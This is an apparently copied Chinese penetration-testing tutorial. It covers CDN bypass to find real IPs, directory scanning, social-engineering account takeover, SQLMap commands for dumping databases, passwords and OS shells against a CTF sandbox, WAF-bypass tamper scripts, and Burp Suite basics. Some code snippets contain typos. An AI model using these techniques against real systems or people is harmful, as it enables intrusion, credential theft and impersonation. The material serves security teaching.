+<p>CMS(Content Management System)又称整站系统或文章系统。常见的CMS有Dedecms (织梦)、Discuz、 PHPWEB、 PHPWind、PHPCMS、ECShop、Dvbbs、 SiteWeaver、 ASPCMS、帝国、Z- Blog、WordPress等。</p>
+<p>代表工具有御剑Web指纹识别、WhatWeb、 WebRobo、 椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
+<p>除了这些工具，还可以利用一些在线网站查询CMS指纹识别:</p>
+<ul>
+<li>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li>
+<li>云悉指纹: <a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li>
+</ul>
+<h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN,可以直接通过<a href="http://www.ip138.com">ip138</a>获取目标的一些IP及域名信息。这里主要讲解在以下这几种情况下，如何绕过CDN寻找目标服务器的真实IP。</p>
+<h4 id="1-目标服务器存在CDN"><a href="#1-目标服务器存在CDN" class="headerlink" title="1.目标服务器存在CDN"></a>1.目标服务器存在CDN</h4><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说得简单点，就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源(例如静态的html、css、js图片等文件)直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
+<p>所以如果渗透目标购买了CDN服务，可以直接ping目标的域名，但得到的并非真正的目标Web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们没法直接得到目标的真实IP段范围。</p>
+<h4 id="2-判断目标是否使用了CDN"><a href="#2-判断目标是否使用了CDN" class="headerlink" title="2.判断目标是否使用了CDN"></a>2.判断目标是否使用了CDN</h4><p>通常会通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了<br>CDN.</p>
+<p>还可以利用在线网站<a href="https://www.17ce.com">17CE</a>进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p>
+<h4 id="3-绕过CDN寻找真实IP"><a href="#3-绕过CDN寻找真实IP" class="headerlink" title="3.绕过CDN寻找真实IP"></a>3.绕过CDN寻找真实IP</h4><p>在确认了目标确实用了CDN以后，就需要绕过CDN寻找目标的真实IP，下面介绍一些常规的方法。</p>
+<ul>
+<li>内部邮箱源。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的)</li>
+<li>扫描网站测试文件.如phpinfo、test等,从而找到目标的真实IP。</li>
+<li>分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</li>
+<li>国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不<br>一定了。因此，通过国外在线代理网站<a href="https://asm.ca.com/en/ping.php">App Synthetic Monitor</a>访问，可能会得到真实的IP</li>
+<li>查询域名的解析记录。也许目标很久以前并没有用过CDN，所以可以通过<br>网站<a href="https://www.netcraft.com/">NETCRAFT</a>来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</li>
+<li>如果目标网站有自己的App,可以尝试利用Fiddler或Burp Suite抓取App的<br>请求，从里面找到目标的真实IP。</li>
+<li>绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的<br>CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站<a href="http://www.crimeflare.com/">Cloud<br>FlareWatch</a>对CloudFlare客户网站进行真实IP查询</li>
+</ul>
+<p>参考资料:</p>
+<p><a href="https://www.uedbox.com/post/65312/">13种绕过CDN查找真实IP的方法</a></p>
+<p><a href="https://www.ddosi.com/cdnip/">绕过cdn查找网站真实ip借助网络空间搜索引擎</a></p>
+<h4 id="4-验证获取的IP"><a href="#4-验证获取的IP" class="headerlink" title="4.验证获取的IP"></a>4.验证获取的IP</h4><p>找到目标的真实IP以后，如何验证其真实性呢?如果是Web,最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样;或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，观察响应结果是否为目标站点。</p>
+<h3 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h3><p>在渗透测试中，探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理页面、文件上传界面，甚至可能扫描出网站的源代码。</p>
+<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py(轻量级快速单文件目录后台扫描)、Sensitivefilescan(轻量级快速单文件目录后台扫描)、Weakfilescan(轻量级快速单文件目录后台扫描)等工具。</p>
+<p>除此之外，还可以利用很多在线工具站，效果也相当不错，这里推荐一个: <a href="http://www.webscan.cc/">WebScan</a>.</p>
+<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一<br>名员工的口中挖掘出本应该是秘密的信息。</p>
+<p>假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p>
+<p>通过进一步地应用社会工程学，假设现在已经收集了目标人物的邮箱、QQ、电话号码、姓名，以及域名服务商，也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p>
+<p>除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到已经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库.</p>
+<h2 id="常用的渗透测试工具"><a href="#常用的渗透测试工具" class="headerlink" title="常用的渗透测试工具"></a>常用的渗透测试工具</h2><h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、sQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
+<ul>
+<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li>
+<li>联合查询注入，在可以使用Union的情况下的注入。</li>
+<li>堆查询注入，可以同时执行多条语句时的注入。</li>
+</ul>
+<p>SQLMap的强大的功能包括数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时实行任意命令。SQLMap的功能强大到让人惊叹，当常规的注入工具不能利用SQL注入漏洞进行注入时，使用SQLMap会有意想不到的效果。</p>
+<h4 id="SQLMap入门"><a href="#SQLMap入门" class="headerlink" title="SQLMap入门"></a>SQLMap入门</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><p>假设目标注入点是<a href="http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示">http://challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800/?id=1,判断其是否存在注入的命令如下所示</a>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143031706.png" alt=""></p>
+<p>还有一种情况， 当注入点后面的参数大于等于两个时，需要加双引号，如下所<br>示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&amp;uid&#x3D;2&quot;</span><br></pre></td></tr></table></figure>
+<p>可以看到，运行完判断是否存在注入的语句后，”爆出”一大段代码，下面来分析代码反馈给我们的信息。这里有三处需要选择的地方:第一处的意思为检测到数据库可能是MySQL,是否需要跳过检测其他数据库;第二处的意思是在”level1、risk1”的情况下，是否使用MySQL对应的所有Payload进行检测;第三处的意思是参数ID存在漏洞，是否要继续检测其他参数，一般默认按回车键即可，如下所示。</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143817878.png" alt=""></p>
+<h5 id="2-判断文本中的请求是否存在注入"><a href="#2-判断文本中的请求是否存在注入" class="headerlink" title="2.判断文本中的请求是否存在注入"></a>2.判断文本中的请求是否存在注入</h5><p>从文件中加载HTTP请求，SQLMap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包。</p>
+<p>判断是否存在注入的命令如下所示，-r一般在存在cookie注入时使用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r desktop&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+<h5 id="3-查询当前用户下的所有数据库"><a href="#3-查询当前用户下的所有数据库" class="headerlink" title="3.查询当前用户下的所有数据库"></a>3.查询当前用户下的所有数据库</h5><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图3-7所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145601887.png" alt=""></p>
+<p>从下图中可以看到，查询出了4个数据库及所有数据库的库名。当继续注入时，—dbs缩写成-D xxx，其意思是在xxx数据库中继续查询其他数据。</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145728862.png" alt=""></p>
+<h5 id="4-获取数据库中的表名"><a href="#4-获取数据库中的表名" class="headerlink" title="4.获取数据库中的表名"></a>4.获取数据库中的表名</h5><p>该命令的作用是查询完数据库后，查询指定数据库中所有的表名，如下所示。<br>如果在该命令中不加入-D参数来指定某一个具体的数据库，那么SQLMap会列出数据<br>库中所有库的表，如图3-8所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 -D sqli --tables</span><br></pre></td></tr></table></figure>
+<p>当继续注入时，—tables缩写成-T，意思是在某表中继续查询。</p>
+<h5 id="5-获取表中的字段名"><a href="#5-获取表中的字段名" class="headerlink" title="5.获取表中的字段名"></a>5.获取表中的字段名</h5><p>该命令的作用是查询完表名后，查询该表中所有的字段名。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag --columns</span><br></pre></td></tr></table></figure>
+<p>在后续的注入中,—columns缩写成-C.</p>
+<h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><p>该命令是查询完字段名之后，获取该字段中具体的数据信息，如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; -D sqli -T flag -C username,password --dump</span><br></pre></td></tr></table></figure>
+<p>这里需要获取的数据是sqli数据库里flag表中username和password的值</p>
+<h5 id="7-获取数据库的所有用户"><a href="#7-获取数据库的所有用户" class="headerlink" title="7.获取数据库的所有用户"></a>7.获取数据库的所有用户</h5><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --users</span><br></pre></td></tr></table></figure>
+<h5 id="8-获取数据库用户的密码"><a href="#8-获取数据库用户的密码" class="headerlink" title="8.获取数据库用户的密码"></a>8.获取数据库用户的密码</h5><p>该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash,并尝试破解。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --passwords</span><br></pre></td></tr></table></figure>
+<p>密码使用MD5加密，可以在<a href="http://www.cmd5.com中自行解密。">http://www.cmd5.com中自行解密。</a></p>
+<h5 id="9-获取当前网站数据库的名称"><a href="#9-获取当前网站数据库的名称" class="headerlink" title="9.获取当前网站数据库的名称"></a>9.获取当前网站数据库的名称</h5><p>使用该命令可以列出当前网站使用的数据库，如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
+<h5 id="10-获取当前网站数据库的用户名称"><a href="#10-获取当前网站数据库的用户名称" class="headerlink" title="10.获取当前网站数据库的用户名称"></a>10.获取当前网站数据库的用户名称</h5><p>使用该命令可以列出当前网站使用的数据库用户，如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;challenge-fc8eea99a1f73579.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1&quot; --current-user</span><br></pre></td></tr></table></figure>
+<h4 id="SQLMap进阶"><a href="#SQLMap进阶" class="headerlink" title="SQLMap进阶"></a>SQLMap进阶</h4><h5 id="1-—level-5-探测等级"><a href="#1-—level-5-探测等级" class="headerlink" title="1.—level 5:探测等级"></a>1.—level 5:探测等级</h5><p>参数—level 5指需要执行的测试等级，一共有5个等级(1~5)，可不加level,默认是1。SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的Payload,其中5级包含的Payload最多，会自动破解出cookie、XFF等头部注入。当然，level 5的运行速度也比较慢。<br>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP<br>cookie在level为2时就会测试，HTTP User Agent/Referer头在level为3时就会测试。<br>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。</p>
+<h5 id="2-—is-dba-当前用户是否为管理权限"><a href="#2-—is-dba-当前用户是否为管理权限" class="headerlink" title="2.—is-dba:当前用户是否为管理权限"></a>2.—is-dba:当前用户是否为管理权限</h5><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输入该命令，会返回Ture或False</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --is-dba</span><br></pre></td></tr></table></figure>
+<h5 id="3-—roles-列出数据库管理员角色"><a href="#3-—roles-列出数据库管理员角色" class="headerlink" title="3.—roles:列出数据库管理员角色"></a>3.—roles:列出数据库管理员角色</h5><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候</p>
+<h5 id="4-—referer-HTTP-Referer头"><a href="#4-—referer-HTTP-Referer头" class="headerlink" title="4.—referer:HTTP Referer头"></a>4.—referer:HTTP Referer头</h5><p>SQLMap可以在请求中伪造HTTP中的referer,当—level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如—referer <a href="http://www.baidu.com">http://www.baidu.com</a>.</p>
+<h5 id="5-—sql-shell-运行自定义SQL语句"><a href="#5-—sql-shell-运行自定义SQL语句" class="headerlink" title="5.—sql-shell:运行自定义SQL语句"></a>5.—sql-shell:运行自定义SQL语句</h5><p>该命令用于执行指定的SQL语句，如下所示，假设执行select * from users<br>limit O,1语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.1.7&#x2F;sql&#x2F;union.php?id&#x3D;1&quot; --sq|-shell</span><br></pre></td></tr></table></figure>
+<h5 id="6-—os-cmd-—os-shell-运行任意操作系统命令"><a href="#6-—os-cmd-—os-shell-运行任意操作系统命令" class="headerlink" title="6.—os-cmd,—os-shell:运行任意操作系统命令"></a>6.—os-cmd,—os-shell:运行任意操作系统命令</h5><p>在数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，如果数据库为MySQL、PostgreSQL, SQLMap上传一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp_cmdshell存储过程，如果被禁用(在Microsoft SQL Server 2005及以上版本默认被禁制)，则SQLMap会重新启用它;如果不存在，会自动创建。<br>用—os-shell参数可以模拟一个真实的Shell,输入想执行的命令。当不能执行多语句时(比如PHP或ASP的后端数据库为MySQL)，仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。—os-shell支持ASP、ASP.NET、JSP和PHP四种语言(要想执行改参数，需要有数据库管理员权限，也就是—is-dba的值要为True)。</p>
+<h5 id="7-—file-read-从数据库服务器中读取文件"><a href="#7-—file-read-从数据库服务器中读取文件" class="headerlink" title="7.—file-read:从数据库服务器中读取文件"></a>7.—file-read:从数据库服务器中读取文件</h5><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p>
+<h5 id="8-—file-write-—file-dest-上传文件到数据库服务器中"><a href="#8-—file-write-—file-dest-上传文件到数据库服务器中" class="headerlink" title="8.—file-write —file-dest:上传文件到数据库服务器中"></a>8.—file-write —file-dest:上传文件到数据库服务器中</h5><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p>
+<h4 id="SQLMap自带绕过脚本tamper的讲解"><a href="#SQLMap自带绕过脚本tamper的讲解" class="headerlink" title="SQLMap自带绕过脚本tamper的讲解"></a>SQLMap自带绕过脚本tamper的讲解</h4><p>SQLMap在默认情况下除了使用CHAR()函数防止出现单引号，没有对注入的数据进行修改，读者还可以使用—tamper参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，命令如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap XXXXX --tamper &quot;模块名&quot;</span><br></pre></td></tr></table></figure>
+<p>下面是一个tamper脚本的格式:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sqlmap&#x2F;tamper&#x2F;esc apequotes.py</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">_priority_ &#x3D; PRIORITY.LOWEST</span><br><span class="line">def dependencies():</span><br><span class="line">	pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">	return pay1oad.replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;).replace(&#39;&quot;&#39;,&#39;\\&quot;&#39;)</span><br></pre></td></tr></table></figure>
+<p>不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。</p>
+<ul>
+<li>priority定义脚本的优先级，用于有多个tamper脚本的情况。</li>
+<li>dependencies函数声明该脚本适用/不适用的范围，可以为空。</li>
+</ul>
+<p>下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和tamper两个函数构成。def tamper(payload, **kwargs) 函数接收playload和**kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def tamper(pay1oad,**kwargs):</span><br><span class="line">	retval &#x3D; payload</span><br><span class="line">    if payload:</span><br><span class="line">    	for match in re.finditer(r&quot;[A-Za-z_]+&quot;,retVal):</span><br><span class="line">    		word &#x3D; match.group()</span><br><span class="line">            if word.upper() in kb.keywords:</span><br><span class="line">            retVal &#x3D; retVal.replace(word,word.upper())</span><br><span class="line">    return retval</span><br></pre></td></tr></table></figure>
+<p>在日常使用中，我们会对一些网站是否有安全防护(WAF/IDS/IPS)进行试探，可以使用参数—identify-waf进行检测。</p>
+<h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务器端的返回信息等。Burp Suite主要拦截HTTP和HTTPS协议的流量，通过拦截，Burp Suite以中间人的方式对客户端的请求数据、服务端的返回信息做各种处理，以达到安全测试的目的。</p>
+<h4 id="Burp-Suite入门"><a href="#Burp-Suite入门" class="headerlink" title="Burp Suite入门"></a>Burp Suite入门</h4><p>在日常工作中，最常用的Web客户端就是Web浏览器，我们可以通过设置代理信息，拦截Web浏览器的流量,并对经过Burp Suite代理的流量数据进行处理。</p>
+<p>Burp Suite运行后，Burp Proxy默认本地代理端口为8080</p>
+<p><img src="https://i.loli.net/2021/05/16/mEcBXU3rwgNjDGo.png" alt=""></p>
+<p>这里以Firefox浏览器为例，单击浏览器右上角”打开菜单”，依次单击”首选项”→”常规”→”网络设置”→”设置”→”手动配置代理”，设置HTTP代理为127.0.0.1,端口为8080,与Burp Proxy中的代理一致。</p>
+<p><img src="https://i.loli.net/2021/05/16/LPQmOYiM9laxuNZ.png" alt=""></p>
+<p><img src="https://i.loli.net/2021/05/16/gtxIL69c3DOPjiH.png" alt=""></p>
+<p><img src="https://i.loli.net/2021/05/16/EgpWPxyozJOCbXk.png" alt=""></p>
+<h5 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h5><p>Burp Proxy是利用Burp开展测试流程的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端与服务端之间传输的数据。</p>
+<p><img src="https://i.loli.net/2021/05/16/12Q5rDLZIb6dVnv.png" alt=""></p>
+<p>Burp Proxy的拦截功能主要由Intercept选项卡中的Forward、Drop、Interception is on/off和Action构成，它们的功能如下所示。</p>
+<ul>
+<li>Forward表示将拦截的数据包或修改后的数据包发送至服务器端。</li>
+<li>Drop表示丢弃当前拦截的数据包。</li>
+<li>Interception is on表示开启拦截功能，单击后变为Interception is off, 表示关闭拦截功能。</li>
+<li>单击Action按钮，可以将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能组件做进一 步的测试，同时也包含改变数据包请求方式及其body的编码等功能。</li>
+</ul>
+<p>打开浏览器，输入需要访问的URL并按回车键，这时将看到数据流量经过Burp Proxy并暂停，直到单击Forward按钮，才会继续传输下去。如果单击了Drop按钮，这次通过的数据将丢失，不再继续处理。</p>
+<p><img src="https://i.loli.net/2021/05/16/EbY7sNiQvn5lA6u.png" alt=""></p>
+<p>当Burp Suite拦截的客户端和服务器交互之后，我们可以在Burp Suite的消息分析选项中查看这次请求的实体内容、消息头、请求参数等信息。Burp有四种消息类型显示数据包: Raw、Params、Headers和Hex。</p>
+<ul>
+<li>Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</li>
+<li>Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</li>
+<li>Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</li>
+<li>Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用。</li>
+</ul>
+<h5 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h5><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
+<h5 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h5><p>Decoder的功能比较简单，它是Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
+<p>Decoder的界面如图3-25所示。输入域显示的是需要编码/解码的原始数据，此处可以直接填写或粘贴，也可以通过其他Burp工具上下文菜单中的”Send to Decoder”选项发送过来;输出域显示的是对输入域中原始数据进行编码/解码的结果。无论是输入域还是输出域都支持文本和Hex这两种格式，编码解码选项由解码选项(Decode as)、编码选项 (Encode as)、散列 (Hash)构成。在实际使用时，可<br>以根据场景的需要进行设置。 </p>
+<p><img src="https://i.loli.net/2021/05/16/8tx7sZk9n5RJrvV.png" alt=""></p>
+<h4 id="Burp-Suite进阶"><a href="#Burp-Suite进阶" class="headerlink" title="Burp Suite进阶"></a>Burp Suite进阶</h4><h5 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h5><p>Burp Scanner主要用于自动检测Web系统的各种漏洞。此处介绍Burp<br>Scanner的基本使用方法，在实际使用中可能会有所改变，但大体环节如下。首先，确认Burp Suite正常启动并完成浏览器代理的配置。然后进入Burp<br>Proxy,关闭代理拦截功能，快速浏览需要扫描的域或URL模块，此时在默认情况下，Burp Scanner会扫描通过代理服务的请求，并对请求的消息进行分析来辨别是否存在系统漏洞。而且当我们打开Burp Target时，也会在站点地图中显示请求的URL树。</p>
+<p>我们随便找一个网站进行测试，选择Burp Target的站点地图选项下的链接，在其链接URL上右击选择”Actively scan this host”</p>
+<p><img src="https://i.loli.net/2021/05/16/t9esV3JIkX6LbHx.png" alt=""></p>
+<p>此时会弹出过滤设置，保持默认选项即可扫描整个域</p>
+<p><img src="https://i.loli.net/2021/05/16/XGtoPSdup8I2D19.png" alt=""></p>
+<p><img src="https://i.loli.net/2021/05/16/MsniFYa9w6fgpHo.png" alt=""></p>
+<p>也可以在Proxy下的HTTP history中，选择某个节点上的链接URL并右击选择Do an active scan进行扫描</p>
+<p><img src="https://i.loli.net/2021/05/16/yY9CNxk6QO8nlEM.png" alt=""></p>
+<p>这时，Burp Scanner开始扫描，在Scanner界面下双击即可看到扫描结果</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120022385.png" alt=""></p>
+<p>我们也可以在扫描结果中选中需要进行分析的部分，将其发送到repeater模块<br>中进行模拟提交分析和验证</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120134680.png" alt=""></p>
+<p>当scanner扫描完成后，可以右击Burp Target站点地图选项下的链接，依次选择”issues” “Report issues”选项，然后导出漏洞报告.</p>
+<p>Burp Scanner主要有主动扫描和被动扫描两种扫描方式:</p>
+<h6 id="1-主动扫描-Active-Scanning"><a href="#1-主动扫描-Active-Scanning" class="headerlink" title="1.主动扫描(Active Scanning)"></a>1.主动扫描(Active Scanning)</h6><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
+<ul>
+<li>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</li>
+<li>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</li>
+</ul>
+<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的;对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
